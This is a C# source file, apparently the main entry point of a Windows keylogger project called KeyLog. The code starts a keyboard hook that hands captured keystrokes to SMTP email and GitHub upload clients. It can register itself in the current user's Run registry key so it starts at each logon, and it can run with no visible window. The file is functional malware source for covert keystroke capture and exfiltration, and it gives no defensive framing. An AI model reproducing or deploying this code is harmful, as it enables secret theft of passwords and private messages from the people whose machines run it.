using System;
using System.IO;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Web.Script.Serialization;
using Microsoft.Win32;
using KeyLog.Common;


namespace KeyLog {
  static class Program {

    [STAThread]
    static void Main() {
      var s = LoadSettings("settings.json");
      var c = new ProgramConfig(s);
      var email  = new Smtp(new SmtpConfig(s, "smtp_"));
      var github = new Octokit(new OctokitConfig(s, "github_"));
      KeyHook.Init(new KeyHookConfig(s), email, github);
      Application.ApplicationExit += new EventHandler(Application_Exit);
      if (c.Startup) SetStartup();
      if (!c.Hidden) ShowWindow();
    }


    static void Application_Exit(object sender, EventArgs e) {
      KeyHook.Flush();
      // try { KeyHook.Flush(); }
      // catch (Exception) { }
    }


    // Register this program to run at startup.
    static void SetStartup() {
      var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      key.SetValue("KeyLog", Application.ExecutablePath.ToString());
    }

    static void ShowWindow() {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run(new MainForm());
    }

    static Dictionary<string, string> LoadSettings(string path) {
      var text = File.Exists(path) ? File.ReadAllText(path) : "{}";
      var json = new JavaScriptSerializer();
      return json.Deserialize<Dictionary<string, string>>(text);
    }
  }


  struct ProgramConfig {
    public bool Hidden;
    public bool Startup;

    public ProgramConfig(Dictionary<string, string> config, string prefix="") {
      var c = config;
      var p = prefix;
      c.TryGetValue(p+"hidden",  out string hidden);
      c.TryGetValue(p+"startup", out string startup);
      bool.TryParse(hidden,  out Hidden);
      bool.TryParse(startup, out Startup);
    }
  }
}
